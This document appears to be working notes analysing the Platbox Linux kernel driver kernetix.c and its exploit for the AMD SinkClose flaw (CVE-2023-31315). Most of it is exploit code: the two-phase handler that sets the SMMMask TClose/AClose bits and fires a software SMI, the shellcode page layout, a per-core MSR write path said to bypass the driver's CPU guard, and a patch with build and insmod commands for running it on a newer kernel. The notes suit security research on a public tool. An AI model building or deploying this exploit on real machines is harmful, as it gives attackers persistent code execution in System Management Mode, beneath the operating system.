# Platbox Linux Kernel Driver Analysis -- kernetix.c

## Source Location
- Repository: IOActive/Platbox
- File: `PlatboxDrv/linux/driver/kernetix.c`
- Commit analyzed: 2bc0d2b (pushed November 12, 2024)
- Total lines: 896
- Target: AMD Renoir (Family17h Model60h), SinkClose CVE-2023-31315

---

## IOCTL_SINKCLOSE Handler

### Entry Point
```c
case IOCTL_SINKCLOSE:
    // Safety: refuse if already on CPU 1
    if (smp_processor_id() == 1) return -EINVAL;

    // Map physical page at 0x3000 for Core1 save-state recovery
    pfn = SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR / PAGE_SIZE; // = 3
    sinkclose_core1_recover_page = pfn_to_page(pfn);
    sinkclose_core1_recover_vaddr = kmap(sinkclose_core1_recover_page);

    // Execute sinkclose_exploit() on CPU 0
    smp_call_function_single(0, sinkclose_exploit, swsmi_call, 1/*wait*/);
```

### sinkclose_exploit() -- Core 0 Execution
Two-phase operation keyed on `smi->rax`:

#### Phase 1: Staging (rax == 0x31337)
```c
// Schedule core1_staging on CPU 1 asynchronously
smp_call_function_single_async(1, &csd);  // Core1 runs staging
// Wait for Core1
while (cmpxchg(&core1_staging_executed, 1, 1) != 1);
// Fire SW SMI (normal, TClose disabled) to prime save state
_swsmi(smi);  // SW SMI number: 0x69
// Signal Core1 to continue
atomic_inc(&core1_staging_finished);
```

#### Phase 2: Exploit (rax == 0x31338)
```c
// Schedule core1_sinkclose on CPU 1 asynchronously
smp_call_function_single_async(1, &csd);
// Wait for Core1 to save its registers and signal ready
while (cmpxchg(&core1_sinkclose_executed, 1, 1) != 1);

// THE CRITICAL WINDOW: Set TClose then fire SMI
_rdmsr(0xC0010113, &tseg_mask);         // Read SMMMask
tseg_mask = tseg_mask | (0b11 << 2);   // Set bits[3:2] = TClose+AClose
_wrmsr(0xC0010113, tseg_mask);          // Write SMMMask -- TClose ENABLED
_swsmi(smi);                            // SW SMI fires -> exploit

// Signal Core1 it can exit busy-wait
atomic_inc(&core1_sinkclose_finished);
```

### core1_sinkclose() -- Core 1 Busy-Wait
```c
void core1_sinkclose(void *info) {
    // Save Core1 registers (RIP, RBP, RSP, CR3) into phys page 0x3000+CORE1_FAKE_STATE_AREA
    _store_savestate(sinkclose_core1_recover_vaddr + CORE1_FAKE_STATE_AREA);
    // Signal Core0 we are ready
    atomic_set(&core1_sinkclose_executed, 1);
    // Busy-wait for SMI to complete
    while (cmpxchg(&core1_sinkclose_finished, 1, 1) != 1);
}
```

### Physical Memory Layout
```
0x0000 - 0x0FFF  : phys page 0  -- shellcode (core0_shell, 32-bit SM-mode entry)
0x1000 - 0x1FFF  : phys page 1  -- shellcode continued + fake GDT/paging
0x2000 - 0x2FFF  : phys page 2  -- x64 staging / persistent handler
0x3000 - 0x3FFF  : phys page 3  -- Core1 save state area (CORE1_FAKE_STATE_AREA)
```
All 4 pages must be physically contiguous and identity-mapped.

### SW SMI Number
```c
#define SW_SMI_NUMBER 0x69  // from sinkclose.cpp
// Triggered via: outb(0x69, 0xB2) -- FCH ACPI PM register B2h
```

---

## IOCTL_WRITE_MSR_FOR_CORE Handler

```c
case IOCTL_WRITE_MSR_FOR_CORE:
    WRITE_MSR_FOR_CORE_CALL msr_for_core;
    copy_from_user(&msr_for_core, p, sizeof(...));
    
    smp_call_function_single(
        msr_for_core.core_id,   // target CPU
        write_msr_for_core,     // callback
        &msr_for_core,
        1  // synchronous wait
    );
```

The callback:
```c
static void write_msr_for_core(void *info) {
    PWRITE_MSR_FOR_CORE_CALL ptr = info;
    _wrmsr(ptr->msr, ptr->value);
}
```

This is the mechanism for writing SMMMask TClose bit on a specific core:
- Set TClose on Core 0: `IOCTL_WRITE_MSR_FOR_CORE(core_id=0, msr=0xC0010113, value=tseg_mask|(3<<2))`
- This bypasses the `smp_processor_id()==1` guard (that guard is only in IOCTL_SINKCLOSE)

---

## Per-Core MSR Write Mechanism

`smp_call_function_single(cpu, fn, arg, wait=1)` is the kernel API that:
1. Sends an IPI (Inter-Processor Interrupt) to the target CPU
2. The target CPU executes `fn(arg)` in interrupt context
3. If `wait=1`, the calling CPU blocks until completion

This is how Platbox achieves per-core MSR writes:
- Each core has its own MSR state
- SMMMask (0xC0010113) must be set on Core 0 BEFORE the SW SMI fires on Core 0
- Core 1 must be in a known state (busy-waiting) when the SMI fires

---

## Kernel 7.0.0-14 Compatibility Analysis

### API Status
| API | Status | Notes |
|-----|--------|-------|
| `vm_flags_set()` | OK | Guard at line 162: `>= KERNEL_VERSION(6,3,0)` covers 7.x |
| `class_create(name)` | OK | Guard at line 828: `>= KERNEL_VERSION(6,4,0)` covers 7.x |
| `call_single_data_t` + `INIT_CSD` | OK | Stable API |
| `smp_call_function_single_async` | OK | Available since 3.18 |
| `smp_call_function_single` | OK | Stable |
| `kmap` / `kunmap` | WARNING | Deprecated since 5.17 but still compiles in 7.x |
| `unlocked_ioctl` | OK | Still valid |
| `pfn_to_page` | OK | Stable |

### Required Fix for Clean Build on Kernel 7.0.0-14
Replace in `IOCTL_SINKCLOSE` handler:
```c
// OLD (deprecated, warns on kernel 7.x):
sinkclose_core1_recover_vaddr = kmap(sinkclose_core1_recover_page);
// ...
kunmap(sinkclose_core1_recover_page);

// NEW (kernel 5.17+ preferred):
sinkclose_core1_recover_vaddr = kmap_local_page(sinkclose_core1_recover_page);
// ...
kunmap_local(sinkclose_core1_recover_vaddr);
```

Note: `kmap_local_page` is not valid across sleep points or rescheduling --
this is fine here because the mapping is only used before the SMP call.

### Build Command for Kernel 7.0.0-14
```bash
cd PlatboxDrv/linux/driver/
make -C /lib/modules/7.0.0-14-generic/build M=$(pwd) modules
# Expected: compiles with kmap deprecation warnings, no errors
sudo insmod kernetix.ko
ls -la /dev/kernetix0
```

---

## SinkClose TClose Bit -- Definitive Analysis

### From BIOS CcxSmm Module (confirmed from disassembly):
```
BIOS ONLY sets SMMMask bits[1:0]:
  OR RAX, 0x3  ->  sets bit[0]=TSEG_EN and bit[1]=AValid
  BIOS NEVER sets bit[3]=TClose or bit[2]=AClose

SinkClose exploit sets bits[3:2]:
  tseg_mask |= (0b11 << 2)  ->  sets bit[3]=TClose and bit[2]=AClose
  This is allowed by hardware even with SmmLock=1 (HWCR bit[0]=1)
```

### Why TClose Write Bypasses SmmLock
SmmLock (HWCR[0]=1) prevents writing to:
- SMM_BASE (MSR 0xC0010111) -- SMM entry point
- SMMAddr (MSR 0xC0010112) -- TSEG base address
- SMMMask address bits -- the upper bits that define TSEG location

SmmLock does NOT prevent writing to:
- SMMMask control bits [3:0] -- TClose, AClose, AValid, TSEG_EN
  These bits are architectural and can be modified from ring-0 regardless of SmmLock

This is the hardware design flaw that CVE-2023-31315 exploits.
